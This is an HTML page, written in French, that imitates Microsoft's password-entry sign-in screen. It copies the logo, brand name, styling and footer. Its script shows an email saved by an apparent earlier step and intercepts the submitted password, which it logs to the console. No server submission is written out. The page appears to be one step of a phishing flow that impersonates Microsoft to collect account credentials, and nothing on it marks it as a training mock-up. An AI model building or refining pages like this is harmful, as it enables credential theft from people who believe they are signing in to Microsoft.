<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrez votre mot de passe</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', -apple-system, Roboto, Helvetica, sans-serif;
        }

        body {
            background: radial-gradient(circle at 80% 20%, #e5eef9 0%, #f3f5f8 50%, #eddfe9 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
        }

        .spacer {
            flex: 1;
        }

        /* Conteneur principal blanc englobant l'intégralité du formulaire */
        .login-card {
            background: #ffffff;
            width: 100%;
            max-width: 440px;
            padding: 44px;
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
            display: flex;
            flex-direction: column;
        }

        .header-row {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .back-link {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            margin-right: 16px;
            text-decoration: none;
            cursor: pointer;
        }

        .back-link:hover {
            background-color: rgba(0, 0, 0, 0.05);
        }

        .logo-container {
            display: flex;
            align-items: center;
        }

        .ms-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 2px;
            width: 21px;
            height: 21px;
            margin-right: 12px;
        }

        .ms-grid span { display: block; }
        .c1 { background-color: #f25022; } 
        .c2 { background-color: #7fba00; } 
        .c3 { background-color: #00a4ef; } 
        .c4 { background-color: #ffb900; }

        .brand-text {
            font-size: 16px;
            font-weight: 600;
            color: #737373;
        }

        .identity-display {
            font-size: 15px;
            color: #1b1b1b;
            margin-bottom: 16px;
            word-break: break-all;
        }

        h2 {
            color: #1b1b1b;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
        }

        .input-wrapper {
            margin-bottom: 20px;
            width: 100%;
        }

        .input-wrapper fieldset {
            border: 1px solid #0067b8; /* Bordure bleue distinctive */
            border-radius: 4px;
            padding: 0 12px;
        }

        .input-wrapper legend {
            font-size: 12px;
            color: #0067b8;
            padding: 0 4px;
            margin-left: 8px;
        }

        .input-box-row {
            display: flex;
            align-items: center;
            width: 100%;
        }

        input[type="password"], input[type="text"] {
            width: 100%;
            border: none;
            outline: none;
            padding: 10px 0;
            font-size: 16px;
            background: transparent;
        }

        .toggle-password {
            background: none;
            border: none;
            cursor: pointer;
            padding: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .btn-submit-block {
            width: 100%;
            background-color: #0067b8;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            padding: 10px 20px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 24px;
            text-align: center;
        }

        .btn-submit-block:hover {
            background-color: #005da6;
        }

        .alt-methods {
            text-align: left;
            font-size: 13px;
        }

        .alt-methods a {
            color: #0067b8;
            text-decoration: none;
        }

        .alt-methods a:hover {
            text-decoration: underline;
        }

        /* Pied de page */
        .footer-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            width: 100%;
            padding: 20px 0 12px 0;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-bottom: 6px;
            flex-wrap: wrap;
        }

        .footer-links a, .footer-note {
            color: #666666;
            font-size: 11px;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .footer-note {
            text-align: center;
            max-width: 90%;
        }
    </style>
</head>
<body>

    <div class="spacer"></div>

    <!-- Tout le contenu visuel est désormais proprement encapsulé ici -->
    <div class="login-card">
        
        <div class="header-row">
            <a href="index.html" class="back-link" aria-label="Retour">
                <svg viewBox="0 0 24 24" width="20" height="20">
                    <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z" fill="#1b1b1b"/>
                </svg>
            </a>
            <div class="logo-container">
                <div class="ms-grid">
                    <span class="c1"></span><span class="c2"></span>
                    <span class="c3"></span><span class="c4"></span>
                </div>
                <span class="brand-text">Microsoft</span>
            </div>
        </div>

        
            <span id="user-email-text"></span>
        </div>

        <h2>Entrez votre mot de passe</h2>

        <form id="password-form">
            <div class="input-wrapper">
                <fieldset>
                    <legend>Mot de passe</legend>
                    <div class="input-box-row">
                        <input type="password" id="password-field" required autocomplete="off">
                        <button type="button" class="toggle-password" id="eye-icon-trigger" aria-label="Afficher le mot de passe">
                            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#666" stroke-width="2">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </button>
                    </div>
                </fieldset>
            </div>

            <button type="submit" class="btn-submit-block">Suivant</button>
        </form>

        <div class="alt-methods">
            <a href="#">Autres méthodes pour se connecter</a>
        </div>

    </div> <!-- Fin de la structure du bloc blanc -->

    <div class="footer-container">
        <div class="footer-links">
            <a href="#">Aide et commentaires</a>
            <a href="#">Conditions d'utilisation</a>
            <a href="#">Confidentialité et cookies</a>
        </div>
        <div class="footer-note">
            Utilisez la navigation privée s'il ne s'agit pas de votre appareil. <a href="#" style="color:#0067b8;">Découvrir plus d'informations</a>
        </div>
    </div>

    <script>
        // Récupération dynamique de la valeur saisie à l'étape précédente
        document.addEventListener('DOMContentLoaded', function() {
            const savedEmailValue = localStorage.getItem('user_email') || 'hkvvvjkvvh';
            document.getElementById('user-email-text').textContent = savedEmailValue;
            document.getElementById('password-field').focus();
        });

        // Gestionnaire d'affichage en clair du mot de passe
        const eyeTrigger = document.getElementById('eye-icon-trigger');
        const passwordField = document.getElementById('password-field');
        
        eyeTrigger.addEventListener('click', function() {
            if (passwordField.type === "password") {
                passwordField.type = "text";
            } else {
                passwordField.type = "password";
            }
        });

        // Interception de la validation finale du formulaire
        document.getElementById('password-form').addEventListener('submit', function(e) {
            e.preventDefault();
            console.log('Mot de passe soumis :', passwordField.value);
        });
    </script>
</body>
</html>
